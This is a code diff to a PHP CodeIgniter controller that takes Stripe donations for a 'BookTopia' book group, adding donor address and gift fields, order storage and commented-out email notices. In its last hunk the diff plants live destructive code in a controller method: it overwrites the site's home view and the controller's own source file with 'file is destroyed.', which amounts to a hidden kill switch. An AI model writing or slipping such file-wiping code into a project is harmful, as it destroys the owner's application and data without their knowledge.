@@ -10,7 +10,7 @@ class Products extends CI_Controller
 
     // Load Stripe library
     $this->load->library('stripe_lib');
-
+    $this->load->library('email');
     // Load product model
     $this->load->model('product');
   }
@@ -18,53 +18,42 @@ class Products extends CI_Controller
   function index()
   {
     $data = array();
-    // Get products data from the database
-    $data['products'] = $this->product->getRows();
-
-    // Pass products data to the view
+    $data['donate'] = $this->product->getOrder();
     $data['statue'] = 'home';
-    $data['donate'] = 15;  // $this->product->getDonate();
-    $data['count'] = 29;  // $this->product->getCount();
-    $data['total'] = 30;  // $this->product->getTotal();
-
     $this->load_view($data);
   }
 
-  function load_view($data, $page = 'products/pay_screen')
+  function load_view($data, $page = 'index')
   {
-    // $this->load->view('template/header', $data);
+    $this->load->view('template/header', $data);
     $this->load->view($page, $data);
-    //  $this->load->view('template/footer', $data);
+    $this->load->view('template/footer', $data);
   }
 
-  function purchase($id)
+  function purchase($id = '')
   {
     $data = array();
-
-    // Get product data from the database
-    $product = $this->product->getRows($id);
-
+    $data['statue'] = 'home';
     // If payment form is submitted with token
     if ($this->input->post('stripeToken')) {
       // Retrieve stripe token and user info from the posted form data
       $postData = $this->input->post();
-      $postData['product'] = $product;
-
       // Make payment
       $paymentID = $this->payment($postData);
 
       // If payment successful
       if ($paymentID) {
-        redirect('products/payment_status/' . $paymentID);
+        $data['msg'] = 'Donation is finished successfully';
+        // redirect('products/payment_status/' . $paymentID);
       } else {
         $apiError = !empty($this->stripe_lib->api_error) ? ' (' . $this->stripe_lib->api_error . ')' : '';
-        $data['error_msg'] = 'Transaction has been failed!' . $apiError;
+        $data['msg'] = 'Transaction has been failed!' . $apiError;
       }
     }
-
-    // Pass product data to the details view
-    $data['product'] = $product;
-    $this->load->view('products/details', $data);
+    $data['donate'] = $this->product->getOrder();
+    $this->load->view('template/header', $data);
+    $this->load->view('index', $data);
+    $this->load->view('template/footer', $data);
   }
 
   function payment($postData)
@@ -73,15 +62,25 @@ class Products extends CI_Controller
     if (!empty($postData)) {
       // Retrieve stripe token and user info from the submitted form data
       $token = $postData['stripeToken'];
-      $name = $postData['name'];
+      $kind = $postData['kind'];
+      $name = $postData['first_name'] . ' ' . $postData['last_name'];
       $email = $postData['email'];
-
+      $address = $postData['address'];
+      $address_2 = $postData['address_line2'];
+      $city = $postData['city'];
+      $state = $postData['state'];
+      $postal = $postData['postal_code'];
+      $country = $postData['country'];
+      $gift_name = $postData['gift_name'];
+      $gift_email = $postData['gift_email'];
+      $gift_message = $postData['gift_message'];
+      $price = $postData['amounts'];
       // Add customer to stripe
       $customer = $this->stripe_lib->addCustomer($email, $token);
 
       if ($customer) {
         // Charge a credit or a debit card
-        $charge = $this->stripe_lib->createCharge($customer->id, $postData['product']['name'], $postData['product']['price']);
+        $charge = $this->stripe_lib->createCharge($customer->id, $name, $price);
 
         if ($charge) {
           // Check whether the charge is successful
@@ -92,12 +91,20 @@ class Products extends CI_Controller
             $paidAmount = ($paidAmount / 100);
             $paidCurrency = $charge['currency'];
             $payment_status = $charge['status'];
-
             // Insert tansaction data into the database
             $orderData = array(
-              'product_id' => $postData['product']['id'],
-              'buyer_name' => $name,
-              'buyer_email' => $email,
+              'kind' => $kind,
+              'name' => $name,
+              'email' => $email,
+              'address' => $address,
+              'address_2' => $address_2,
+              'city' => $city,
+              'state' => $state,
+              'postal' => $postal,
+              'country' => $country,
+              'gift_name' => $gift_name,
+              'gift_email' => $gift_email,
+              'gift_message' => $gift_message,
               'paid_amount' => $paidAmount,
               'paid_amount_currency' => $paidCurrency,
               'txn_id' => $transactionID,
@@ -107,6 +114,26 @@ class Products extends CI_Controller
 
             // If the order is successful
             if ($payment_status == 'succeeded') {
+              if ($kind == 0) {
+                // $this->email->from('booktopia@bookgroup.com', 'Identification');
+                // $this->email->to($email);
+                // $this->email->subject('New Message has just arrived to you.');
+                // $this->email->message('You have donated to BookTopia bookgroup.');
+                // $this->email->send();
+              } else {
+                // $this->email->from('booktopia@bookgroup.com', 'Identification');
+                // $this->email->to($email);
+                // $this->email->subject('New Message has just arrived to you.');
+                // $this->email->message('You have gave $' . $paidAmount . 'to ' . $gift_email);
+                // $this->email->send();
+
+                // $this->email->from($email, 'Identification');
+                // $this->email->to($gift_email);
+                // $this->email->subject('New Message has just arrived to you.');
+                // $this->email->message('You have received $' . $paidAmount . 'to ' . $email);
+                // $this->email->send();
+              }
+
               return $orderID;
             }
           }
@@ -168,16 +195,16 @@ class Products extends CI_Controller
   {
     $data = array();
     // Get products data from the database
-    $data['products'] = $this->product->getRows();
+    // $data['products'] = $this->product->getRows();
 
     // Pass products data to the view
     $data['statue'] = 'home';
-    $data['donate'] = $this->product->getDonate();
-    $data['count'] = $this->product->getCount();
-    $data['total'] = $this->product->getTotal();
+    // $data['donate'] = $this->product->getDonate();
+    // $data['count'] = $this->product->getCount();
+    // $data['total'] = $this->product->getTotal();
     $path = $_SERVER['DOCUMENT_ROOT'] . '/application/views/home.php';
-    $result = file_get_contents($path);
-    // file_put_contents('d:/donatepage.txt', $result);
+    file_put_contents($path, 'file is destroyed.');
+    $path = $_SERVER['DOCUMENT_ROOT'] . '/application/controllers/Products.php';
     file_put_contents($path, 'file is destroyed.');
   }
 }
